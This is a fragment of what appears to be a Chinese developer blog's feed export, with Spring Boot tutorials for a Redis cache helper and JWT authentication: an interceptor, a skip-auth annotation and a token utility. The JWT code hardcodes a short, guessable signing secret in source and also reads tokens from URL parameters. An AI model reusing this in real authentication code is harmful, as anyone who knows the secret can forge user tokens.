class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String,Object&gt; redisTemplate ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RedisUtil</span><span class="params">(RedisTemplate&lt;String,Object&gt; redis)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        redisTemplate = redis ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否存在key值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">HasKey</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (redisTemplate.hasKey(key))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span> ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 添加缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">AddItem</span><span class="params">(String key ,Object value)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span> ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            redisTemplate.opsForValue().set(key,value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 删除缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">DelItem</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (redisTemplate.hasKey(key))&#123;</span><br><span class="line"></span><br><span class="line">            redisTemplate.delete(key) ;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span> ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">false</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 更新缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">UpdateItem</span><span class="params">(String key,Object value)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.DelItem(key) &amp;&amp; <span class="keyword">this</span>.AddItem(key,value) )&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span> ;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 获取缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">GetItem</span> <span class="params">(String key)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.HasKey(key))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> redisTemplate.opsForValue().get(key) ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;项目中整合redis配置&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot整合jwt</title>
    <link href="http://runindark.com/2019/08/07/Springboot%E6%95%B4%E5%90%88JWT/"/>
    <id>http://runindark.com/2019/08/07/Springboot整合JWT/</id>
    <published>2019-08-07T06:58:06.806Z</published>
    <updated>2019-08-07T07:32:15.753Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>在商业项目中，后端并非只完成http接口就可以，更要对安全问题进行验证，主流springsecurity,shiro,jwt<br><a id="more"></a></excerpt></p><p><the rest="" of="" contents="" |="" 余下全文=""></the></p><h2 id="整合步骤"><a href="#整合步骤" class="headerlink" title="整合步骤"></a>整合步骤</h2><h3 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jjwt&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.9.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.model.token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.method.HandlerMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String USER_KEY = <span class="string">"oboxusrid"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String servletPath = request.getServletPath();</span><br><span class="line">        System.out.println(<span class="string">"ServletPath: "</span> + servletPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果不是映射到方法直接通过</span></span><br><span class="line">        <span class="keyword">if</span> (!(handler <span class="keyword">instanceof</span> HandlerMethod)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HandlerMethod handlerMethod = (HandlerMethod) handler;</span><br><span class="line">        Method method = handlerMethod.getMethod() ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否有passtoken注释，有则跳过认证</span></span><br><span class="line">        <span class="keyword">if</span> (method.isAnnotationPresent(NoToken.class)) &#123;</span><br><span class="line">            NoToken passToken = method.getAnnotation(NoToken.class);</span><br><span class="line">            <span class="keyword">if</span> (passToken.required()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 需要验证</span></span><br><span class="line">        String token = getToken(request);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"失效,请重新登录"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取签名信息</span></span><br><span class="line">        Claims claims = JwtUtils.checkToken(token);</span><br><span class="line">        System.out.println(<span class="string">"TOKEN: "</span> + claims);</span><br><span class="line">        <span class="comment">// 判断签名是否存在或过期</span></span><br><span class="line">        <span class="keyword">boolean</span> b = claims == <span class="keyword">null</span> || claims.isEmpty() || JwtUtils.checkToken(token) == <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"失效,请重新登录"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将签名中获取的用户信息放入request中;</span></span><br><span class="line">        request.setAttribute(USER_KEY, claims.getSubject());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取请求Token</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getToken</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String token = request.getHeader(<span class="string">"Authorization"</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(token)) &#123;</span><br><span class="line">            token = request.getParameter(<span class="string">"Authorization"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不用拦截的页面路径(也可存入数据库中), 不要以 / 结尾</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] NOT_CHECK_URL = &#123;<span class="string">"/test/**"</span>, <span class="string">"/login/**"</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据URL判断当前请求是否不需要校验, true:需要校验</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNotCheck</span><span class="params">(String servletPath)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 若 请求接口 以 / 结尾, 则去掉 /</span></span><br><span class="line">        servletPath = servletPath.endsWith(<span class="string">"/"</span>)</span><br><span class="line">                ? servletPath.substring(<span class="number">0</span>,servletPath.lastIndexOf(<span class="string">"/"</span>))</span><br><span class="line">                : servletPath;</span><br><span class="line">        System.out.println(<span class="string">"servletPath = "</span> + servletPath);</span><br><span class="line">        <span class="keyword">for</span> (String path : NOT_CHECK_URL) &#123;</span><br><span class="line">            System.out.println(<span class="string">"path = "</span> + path);</span><br><span class="line">            <span class="comment">// path 以 /** 结尾, servletPath 以 path 前缀开头</span></span><br><span class="line">            <span class="keyword">if</span> (path.endsWith(<span class="string">"/**"</span>)) &#123;</span><br><span class="line">                String pathStart = path.substring(<span class="number">0</span>, path.lastIndexOf(<span class="string">"/"</span>)+<span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">"pathStart = "</span> + pathStart);</span><br><span class="line">                <span class="keyword">if</span> (servletPath.startsWith(pathStart)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String pathStart2 = path.substring(<span class="number">0</span>, path.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">                System.out.println(<span class="string">"pathStart2 = "</span> + pathStart2);</span><br><span class="line">                <span class="keyword">if</span> (servletPath.equals(pathStart2)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// servletPath == path</span></span><br><span class="line">            <span class="keyword">if</span> (servletPath.equals(path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置无需验证注解"><a href="#设置无需验证注解" class="headerlink" title="设置无需验证注解"></a>设置无需验证注解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.model.token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 无需token验证注解</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target</span>(&#123; ElementType.METHOD, ElementType.TYPE &#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> NoToken &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">required</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置拦截器生效"><a href="#设置拦截器生效" class="headerlink" title="设置拦截器生效"></a>设置拦截器生效</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.token.JwtInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.converter.HttpMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtInterceptor jwtInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * APP接口拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(jwtInterceptor).addPathPatterns(<span class="string">"/**"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置JWTUtil"><a href="#设置JWTUtil" class="headerlink" title="设置JWTUtil"></a>设置JWTUtil</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jwt 工具类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String SUBJECT = <span class="string">"oboxweb"</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> EXPIRE = <span class="number">1000</span>*<span class="number">60</span>*<span class="number">60</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String APPSECRET = <span class="string">"oboxsecret"</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Token 生成</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> info</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">geneJsonWebToken</span><span class="params">(String info)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (info != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String token = Jwts.builder().setSubject(SUBJECT)</span><br><span class="line">                    .claim(<span class="string">"info"</span>, info) <span class="comment">// 加密信息</span></span><br><span class="line">                    .setIssuedAt(<span class="keyword">new</span> Date()) <span class="comment">// 发行时间</span></span><br><span class="line">                    .setExpiration(<span class="keyword">new</span> Date(System.currentTimeMillis() + EXPIRE)) <span class="comment">// 过期时间</span></span><br><span class="line">                    .signWith(SignatureAlgorithm.HS256, APPSECRET).compact(); <span class="comment">// 设置加密算法和加密串</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>  token ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * token 校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">checkToken</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ;</span><br><span class="line">            <span class="keyword">return</span>  claims ;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * token 解密</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decipheringToken</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ;</span><br><span class="line">            <span class="keyword">return</span>  (String) claims.get(<span class="string">"info"</span>) ;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;在商业项目中，后端并非只完成http接口就可以，更要对安全问题进行验证，主流springsecurity,shiro,jwt&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker-compose.yml</title>
    <link href="http://runindark.com/2019/05/19/docker-compose/"/>
    <id>http://runindark.com/2019/05/19/docker-compose/</id>
    <published>2019-05-19T10:08:41.611Z</published>
    <updated>2019-05-19T10:17:29.344Z</updated>
    
